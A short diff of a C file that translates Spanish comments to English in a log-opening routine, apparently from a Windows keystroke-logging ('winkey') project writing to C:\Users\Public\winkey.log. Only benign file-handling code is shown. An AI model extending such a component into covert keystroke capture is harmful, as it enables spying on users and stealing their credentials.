@@ -1,6 +1,6 @@
 #include "winkey.h"
 
-// Abre el archivo de Log en C:\Users\Public\winkey.log
+// Opens the log file at C:\Users\Public\winkey.log
 BOOL OpenLogFile(void)
 {
     char logPath[MAX_PATH];
@@ -8,14 +8,14 @@ BOOL OpenLogFile(void)
     struct tm timeInfo;
     long fileSize = 0;
 
-    // Crea la ruta completa del archivo de log
+    // Build full path to log file
     snprintf(logPath, sizeof(logPath), "C:\\Users\\Public\\winkey.log");
 
-    // Abrimos en modo append lectura/escritura para poder detectar si está vacío
+    // Open in append read/write mode to detect if empty
     if (fopen_s(&g_winkeyState.logFile, logPath, "ab+") != 0 || !g_winkeyState.logFile)
         return FALSE;
 
-    // Comprobar si el archivo está vacío para escribir BOM UTF-8 (permite que Notepad detecte codificación)
+    // If file is empty, write UTF-8 BOM so Notepad detects encoding
     if (fseek(g_winkeyState.logFile, 0, SEEK_END) == 0) {
         fileSize = ftell(g_winkeyState.logFile);
         if (fileSize == 0) {
@@ -24,7 +24,7 @@ BOOL OpenLogFile(void)
         }
     }
 
-    // Obtiene tiempo actual y escribe cabecera de inicio
+    // Get current time and write start header
     time(&currentTime);
     localtime_s(&timeInfo, &currentTime);
     
